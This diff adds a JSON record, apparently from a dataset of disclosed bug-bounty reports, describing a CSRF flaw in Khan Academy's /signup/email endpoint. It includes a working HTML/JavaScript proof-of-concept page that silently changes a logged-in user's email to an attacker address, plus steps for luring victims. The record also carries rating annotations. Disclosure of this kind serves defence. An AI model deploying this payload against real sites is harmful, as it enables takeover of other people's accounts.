@@ -1,0 +1,38 @@
+{
+    "reported_to": "Khan Academy",
+    "reported_by": "rlaneth ",
+    "title": "Cross-Site Request Forgery (CSRF) vulnerability on API endpoint allows account takeovers",
+    "content": "\nSummary\nThe /signup/email API endpoint at khanacademy.org is vulnerable to Cross-Site Request Forgery (CSRF) attacks, allowing takeovers of accounts associated with unconfirmed email addresses.\nDescription\nThe vulnerable endpoint allows an authenticated user to change the email address associated with their account if they have not yet confirmed the current address. However, it does not sufficiently verify that requests were intentionally performed by the user (e.g. by checking the values of HTTP headers and using an anti-CSRF token).\nProof-of-Concept (PoC)\nThis is the code used for the demonstration video attached to this report (ka-signup-email-csrf.mp4).\nCode 1.19 KiB\n1<!DOCTYPE html>\n2<html>\n3    <head>\n4        <meta charset=\"utf-8\" />\n5        <title>Khan Academy Signup Email CSRF PoC</title>\n6        <style type=\"text/css\">\n7        body {\n8            display:flex;\n9            flex-direction:column;\n10            justify-content:center;\n11            min-height:100vh;\n12            margin:0;\n13        }\n14        p {\n15            display:flex;\n16            align-self:center;\n17            font-size:0.8rem;\n18            font-family:sans-serif;\n19            font-weight:bold;\n20            text-transform:uppercase;\n21            letter-spacing:0.1rem;\n22        }\n23        </style>\n24    </head>\n25    <body>\n26        <p>Khan Academy Signup Email CSRF PoC</p>\n27        <script type=\"text/javascript\">\n28            window.addEventListener('load', function(e) {\n29                var attacker_addr = 'attacker@rapidlight.io';\n30                var x = new XMLHttpRequest();\n31                x.open('POST', 'https://www.khanacademy.org/signup/email', true);\n32                x.withCredentials = true;\n33                x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n34                x.send('email=' + encodeURIComponent(attacker_addr));\n35            }, false);\n36        </script>\n37    </body>\n38</html>\nImpact\nAn attacker can exploit this vulnerability in order to take over accounts by associating them with an address controlled by the attacker, then performing a password reset. In order for the attack to be successful, the target user account must be associated with an unconfirmed email address, and the target user must visit an attacker-controlled website while logged in.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-Site Request Forgery (CSRF)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1561180020,
+    "report_url": "https://hackerone.com/reports/419891",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Create an HTML page with a script that sends a POST request to the vulnerable endpoint /signup/email on khanacademy.org, setting the email to an attacker-controlled address."
+        ],
+        [
+            2,
+            "Trick a logged-in user with an unconfirmed email address into visiting the malicious HTML page."
+        ]
+    ],
+    "vuln_description": "The /signup/email API endpoint at khanacademy.org is vulnerable to CSRF attacks, allowing an attacker to change the email address associated with a user's account if the current email is unconfirmed. This can lead to account takeover by performing a password reset on the new email address.",
+    "reason": "The vulnerability is straightforward to discover as it involves a basic CSRF attack without the need for anti-CSRF tokens or other protections. The attack does not require complex interactions or novel logic, and the steps to reproduce are simple and well-documented in web security contexts.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
